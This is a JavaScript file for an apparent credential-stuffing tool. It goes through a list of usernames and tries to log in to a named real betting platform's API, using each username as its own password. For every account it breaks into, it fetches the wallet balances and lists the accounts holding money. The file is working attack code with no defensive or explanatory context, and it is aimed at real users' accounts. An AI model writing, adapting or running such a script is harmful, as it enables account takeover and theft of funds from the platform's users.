let stopRequested = false;
let successfulLogins = [];

function fetchUsernamesFromProcessedList() {
    const wordListContainer = document.getElementById('wordListContainer');
    const usernames = [];
    if (wordListContainer) {
        wordListContainer.querySelectorAll('.word-item').forEach(div => {
            usernames.push(div.textContent.trim());
        });
    }
    return usernames;
}

async function tryLogin(username) {
    if (stopRequested) return null;

    const loginData = {
        domain: "https://www.krikya11.com",
        membercode: username,
        password: username,
        platform: "desktop",
        option: "2",
    };

    let loginResponse, loginResult;
    try {
        loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(loginData),
        });
        loginResult = await loginResponse.json();
    } catch (error) {
        console.log(`Network error for ${username}:`, error);
        return;
    }

    if (loginResponse.ok && loginResult.access_token) {
        await fetchWalletDetails(loginResult.access_token, username);
    } else {
        console.log(`Login failed: ${username}`);
    }
}

async function fetchWalletDetails(token, username) {
    if (stopRequested) return;

    try {
        const response = await fetch(
            "https://feapi.sharky777.xyz/api/member/wallets",
            {
                method: "GET",
                headers: {
                    Authorization: `Bearer ${token}`,
                },
            }
        );

        const result = await response.json();

        if (response.ok && result.data && result.data.wallets) {
            const wallets = result.data.wallets.map(wallet => ({
                code: wallet.wallet_code,
                balance: wallet.balance,
            }));
            displaySuccessResponse(username, wallets);

            // Append wallets with balance >= 1
            const tableBody = document.getElementById("tableBody");
            wallets.forEach(wallet => {
                if (parseFloat(wallet.balance) >= 1) {
                    const tr = document.createElement('tr');
                    const formattedBalance = parseFloat(wallet.balance).toFixed(2);
                    tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${formattedBalance}</td>`;
                    tableBody.appendChild(tr);
                }
            });

            // Save successful login
            successfulLogins.push({ username, wallets });
        } else {
            console.log(`Failed to fetch wallets for ${username}`);
        }
    } catch (error) {
        console.log(`Error fetching wallet details for ${username}:`, error);
    }
}

function displaySuccessResponse(username, wallets) {
    // Save username to successful logins
    successfulLogins.push({ username, wallets });
    // Save to localStorage as comma-separated list of usernames
    localStorage.setItem(
        'success',
        successfulLogins.map(u => u.username).join(',')
    );

    const successOutput = document.getElementById("successOutput");
    let ol = successOutput.querySelector('ol');
    if (!ol) {
        ol = document.createElement('ol');
        successOutput.innerHTML = '';
        successOutput.appendChild(ol);
    }
    const li = document.createElement('li');
    li.textContent = username;
    ol.appendChild(li);
}

function createUserBalanceDiv(username, balance) {
    const tableBody = document.getElementById("tableBody");
    const tr = document.createElement('tr');
    tr.innerHTML = `<td>${username}</td><td>${balance}</td>`;
    tableBody.appendChild(tr);
}

const mainButton = document.getElementById('mainButton');
const stopButton = document.getElementById('stopButton');

mainButton.addEventListener('click', () => {
    processLoginFile();
});

stopButton.addEventListener('click', () => {
    stopLoginAttempts();
});

async function processLoginFile() {
    stopRequested = false;
    successfulLogins = [];
    const usernames = fetchUsernamesFromProcessedList();

    for (const username of usernames) {
        if (stopRequested) {
            console.log("STOPPED");
            alert("Stopped by user");
            return;
        }
        try {
            await tryLogin(username);
        } catch (error) {
            console.log(`Error processing ${username}:`, error);
        }
    }
    alert("Login process finished!");
}

function stopLoginAttempts() {
    stopRequested = true;
}
